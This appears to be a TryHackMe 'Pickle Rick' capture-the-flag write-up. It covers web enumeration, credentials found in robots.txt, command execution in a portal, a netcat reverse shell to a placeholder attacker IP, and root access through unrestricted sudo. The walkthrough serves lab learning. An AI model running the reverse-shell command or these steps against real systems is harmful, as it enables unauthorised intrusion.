# Pickle Rick - TryHackMe Writeup

## 🎯 Objective
The goal of this machine is to enumerate a web application, identify critical security flaws, gain initial access to the system, and escalate privileges to `root`.

---

## 🔍 Enumeration & Discovery

### 1. Network Scanning (Nmap)
Target scanning revealed two open ports:
* **22/tcp** → SSH (OpenSSH 8.2p1 Ubuntu)
* **80/tcp** → HTTP (Apache 2.4.41) | *Website title: Rick is sup4r cool*

### 2. Web Directory Brute-Forcing (Gobuster)
Discovered active and restricted directories:
* `/index.html` (Status: 200)
* `/assets` (Status: 301)
* `/robots.txt` (Status: 200)
* `/server-status` (Status: 403)

### 3. Endpoint Fuzzing (FFUF)
Fuzzing for `.php` extensions revealed:
* `/login.php` → Accessible login portal.
* `/portal.php` → Redirects to authentication gateway.

---

## 🔐 Information Disclosure & Credentials Hunt

* **Source Code Leak:** Inspecting the HTML source code of the homepage exposed a hardcoded developer comment:  
  ``
* **Robots.txt Analysis:** Navigating to `/robots.txt` disclosed a hidden string:  
  `Wubbalubbadubdub`

---

## 💥 Exploitation & Initial Access

Using the harvested credentials (`R1ckRul3s` : `Wubbalubbadubdub`), access to the web portal was successfully granted. 

The portal contained a command execution interface. To bypass web filter boundaries and stabilize the connection, a **Reverse Shell** was initiated using the following payload:

```bash
busybox nc [KALI_IP] 1234 -e /bin/bash
Connection was successfully intercepted via a local Netcat listener as www-data.

⬆️ Privilege Escalation to ROOT
After stabilizing the foothold, post-exploitation enumeration was conducted. Running sudo -l revealed a severe system misconfiguration:

Bash
User www-data may run the following commands on target:
    (ALL) NOPASSWD: ALL
Due to this unrestricted sudo capability, full system compromise was achieved instantly by escalating to the root shell:

Bash
sudo su
🛠️ Tools Used
Recon: Nmap, Gobuster, FFUF

Exploitation: Web Browser, Burp Suite (Optional), Netcat

Environment: Kali Linux Terminal
